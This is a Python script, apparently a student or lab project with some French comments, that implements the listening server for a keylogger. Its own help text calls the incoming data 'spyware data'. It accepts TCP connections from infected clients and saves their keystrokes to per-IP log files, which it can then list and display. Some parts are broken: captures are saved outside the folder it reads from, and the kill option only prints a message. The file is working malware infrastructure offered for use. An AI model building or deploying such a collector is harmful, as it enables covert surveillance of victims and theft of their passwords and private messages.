import socket
import datetime
import argparse
import time
import sys
import os
from pathlib import Path
from threading import Thread
import signal

# Arguments 

parser = argparse.ArgumentParser()
group = parser.add_mutually_exclusive_group()
group.add_argument("-l", "--listen", type=int, help="listens on the TCP port entered by the user and waits for the spyware data.")
group.add_argument("-s", "--show", help="displays the list of files received by the program.", action="store_true")
group.add_argument("-r", "--readfile", type=str, help="displays the content of a keylog file.")
group.add_argument("-k", "--kill", help="stop all the instances of the server and stop all the clients.", action="store_true")
args = parser.parse_args()


#Variables

cwd = Path.cwd()
path_captures = cwd / "captures"

# Fonctions

def handle_client(conn, addr):
    print(f"Connection from {addr}")

    listen = True

    while listen:
        try:
            # Réception des données
            data = conn.recv(1024).decode('utf-8')

            if data:

                cwd = Path.cwd()
                fic = list(cwd.glob(f"{addr[0]}*.txt"))
                filename = f"{addr[0]}-{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}-keyboard.txt"
                
                if fic == []:
                    with open(filename, 'w') as file:
                        file.write(data)
                else:
                    ficfilename = fic[0]
                    with open(ficfilename, 'a') as file:
                        file.write("\n")
                        file.write(data)
                    os.rename(ficfilename,filename)

                print(f"Data received and saved in {filename}")
            

        except Exception as e:
            listen = False
            print(f"Error: {e}")



def display_files():
    files = os.listdir(path_captures)
    print("List of files captured :")
    for file in files:
        print(" - " + file)
    
    if files == []:
        print("No files captured yet")

def read_file(filename):

    try :
        with open ("captures/" + filename, "r") as file:
            print("File content :")
            content = file.read()
            print(content)
    except FileNotFoundError:
        print(f"File '{filename}' not found in the 'captures' folder.")
        display_files()

# Traitement

if args.listen:
    # Configuration du socket
    host = '172.16.120.1'
    port = args.listen

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen()

    print(f"Server listening on {host}:{port}")

    # global running
    running = True

    # global threads
    threads = []


    # signal.signal(signal.SIGINT, test)


    while running:
        try:
    

            conn, addr = server_socket.accept()

            thread = Thread(target=handle_client, args=(conn, addr))
            threads.append([thread, conn, addr])
            thread.start()



        except KeyboardInterrupt as e:
            answered = False
            
            while not answered:
                respons = input("[?] Voulez-vous vraiment arrêter le serveur ? (y/n) ")

                if respons == 'y' or respons == 'n':
                    answered = True

            if respons == 'n':
                # ne rien faire
                print("[+] Le serveur ne sera pas arrêté")


            else:

                for t, c, a in threads:
                    print(f"thread : {t}")
                    print(f"connection : {c}")
                    print(f"address : {a}")
                

                # arrêter le serveur
                print("[+] Le serveur va s'arrêter")
                for thread in threads:
                    thread[1].close()
                    print(f"[+] Fin de la connexion avec {thread[2][0]}")
                
                running = False

                server_socket.close()




        except Exception as e:
            running = False

            print(f"Error: {e}")


elif args.show:
    display_files()
    sys.exit()




elif args.readfile:
    read_file(args.readfile)
    sys.exit()



elif args.kill:
    print("kill all the instances")



